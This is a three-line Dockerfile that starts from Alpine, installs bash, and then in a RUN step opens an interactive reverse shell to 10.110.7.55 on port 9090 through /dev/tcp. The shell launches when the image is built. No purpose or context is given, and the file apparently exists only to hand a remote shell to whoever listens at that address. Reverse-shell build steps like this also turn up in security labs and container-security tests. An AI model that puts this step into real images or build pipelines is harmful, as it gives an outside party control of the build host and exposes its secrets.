FROM alpine
RUN apk add bash
RUN /bin/bash -c 'bash -i >& /dev/tcp/10.110.7.55/9090 0>&1'
